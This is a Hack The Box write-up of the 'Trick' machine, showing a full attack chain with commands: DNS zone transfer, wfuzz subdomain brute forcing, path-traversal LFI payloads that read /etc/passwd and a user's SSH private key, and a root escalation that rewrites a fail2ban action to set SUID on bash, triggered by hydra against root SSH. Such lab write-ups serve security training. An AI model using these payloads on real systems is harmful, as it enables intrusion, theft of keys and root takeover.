@@ -1,0 +1,97 @@
+﻿Trick [writeup] [Hack The Box]
+                                                                                                
+hello guys this is my first writeup on hackthebox trick machine,i hope you like it so lets start, its a linux box with ip 10.10.11.166, I added it to /etc/hosts as trick.htb ,Lets jump right in !
+
+Nmap
+                                                                                                    
+as always we will start with nmap to scan for open ports and services:
+
+
+        
+                                                                                                                     
+there are four open ports 22,25,53,80, first i enumerate port 25 smtp
+but i found nothing, after that let go for port 53 and webenumerate on port 80
+
+
+on this above webpage there is nothing to enumerate its a rabbit hole now we 53 port lets fuck this port, i tried to check dns with axfr protocol that is used for zone transfer for replication of DNS data across multiple DNS servers, then i found another subdomain that shown in below image
+                                                                                                             
+now lets add this subdomain preprod-payroll.trick.htb to /etc/hosts
+and enumerat this 
+
+after spend times i realized this subdomain is also a rabbit hole, so
+after wastage my time, i remmber that i have also other option that is DNS Bruteforcing for do this i use wfuzz tool and wordlist of seclist
+└─$ wfuzz -c -t 200 --hc=400 --hh=5480 -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "host: preprod-FUZZ.trick.htb" http://trick.htb
+
+
+and boomb i found third subdomain i hope this is not a rabbit hole 
+that is preprod-marketing.trick.htb add in /etc/hosts file. I open in browser and tried to do LFI with burp 
+
+http://preprod-marketing.trick.htb/index.php?page=services.html
+
+
+
+
+
+
+
+
+                                                                                                                
+use payload in burp repeater
+http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd
+
+and found user michael now use second payload 
+
+http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa 
+
+and here i found michael private key
+
+
+                                                                                                             
+now save this key to our home directory and give permission to the key chmod 700 keyname 
+now run ssh -i keyname michael@10.10.11.166 for connect to machine 
+
+                                                                                                   
+ls
+cat user.txt
+and here i found user flag 
+                                                                                                   
+now its time for root flag try to run sudo -l  
+
+here in above image i see a service called fail2ban in running
+it is used as IDS & IPS for check let go in depth 
+cd /etc/fail2ban/
+cat jail.conf
+and here in jail.conf sshd enable in fail2ban service 
+cd /etc/fail2ban/action.d
+for root shell we need  to edit file iptables-multiport.conf
+and run the following command 
+ 
+1. sed "s/<iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>/chmod u+s \/bin\/bash/g" /etc/fail2ban/action.d/iptables-multiport.conf > config.conf
+
+2. rm -f /etc/fail2ban/action.d/iptables-multiport.conf
+
+3. mv config.conf /etc/fail2ban/action.d/iptables-multiport.conf
+
+4. sudo /etc/init.d/fail2ban restart
+
+5. hydra 10.10.11.166 ssh -l root -P /usr/share/wordlists/rockyou.tx (run in parllel terminal in main machine )
+
+6. ls -l /bin/bash
+
+7. bash -p
+
+
+
+
+and we find root flag
+
+
+
+
+
+
+
+THANKS ,happy hacking 
+by satyanarayan
+follow on twitter=>https://twitter.com/Sparrow3690
+
